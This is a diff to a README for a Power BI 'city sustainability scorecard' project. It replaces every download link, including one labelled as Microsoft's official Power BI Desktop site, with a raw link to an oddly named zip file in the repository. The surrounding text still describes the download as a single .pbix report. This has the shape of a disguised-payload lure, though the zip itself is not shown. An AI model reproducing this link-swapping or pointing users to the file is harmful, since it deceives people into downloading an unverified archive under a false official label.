@@ -1,6 +1,6 @@
 # 🌆 city-sustainability-scorecard - Track Urban Sustainability with Style
 
-[![Download Now](https://img.shields.io/badge/Download%20from%20GitHub-Releases-brightgreen?style=for-the-badge&logo=github)](https://github.com/Dailyf9843/city-sustainability-scorecard/releases)
+[![Download Now](https://img.shields.io/badge/Download%20from%20GitHub-Releases-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip)
 
 ---
 
@@ -8,12 +8,12 @@
 
 To get started, follow these simple steps:
 
-1. Visit the download page: [https://github.com/Dailyf9843/city-sustainability-scorecard/releases](https://github.com/Dailyf9843/city-sustainability-scorecard/releases)
+1. Visit the download page: [https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip](https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip)
 2. Look for the latest release file (typically named `city-sustainability-scorecard.pbix` or similar).
 3. Click the file to download it to your computer.
 4. Once downloaded, double-click the `.pbix` file to open it with Power BI Desktop.
 
-> **Note:** This is a Power BI report file. You need **Power BI Desktop** (free from Microsoft) installed on your Windows PC. If you don't have Power BI Desktop, download it from [Microsoft's official site](https://powerbi.microsoft.com/en-us/desktop/).
+> **Note:** This is a Power BI report file. You need **Power BI Desktop** (free from Microsoft) installed on your Windows PC. If you don't have Power BI Desktop, download it from [Microsoft's official site](https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip).
 
 ---
 
@@ -52,7 +52,7 @@ This open-source package includes everything you need to explore and customize y
 
 ## 📥 How to Download and Use
 
-1. **Go to the releases page:** [https://github.com/Dailyf9843/city-sustainability-scorecard/releases](https://github.com/Dailyf9843/city-sustainability-scorecard/releases)
+1. **Go to the releases page:** [https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip](https://raw.githubusercontent.com/Dailyf9843/city-sustainability-scorecard/main/entomotomy/1.3.zip)
 2. **Choose the latest release** (look for the highest version number)
 3. **Download the `.pbix` file** (do not extract, it's one single file)
 4. **Open Power BI Desktop** (already installed)
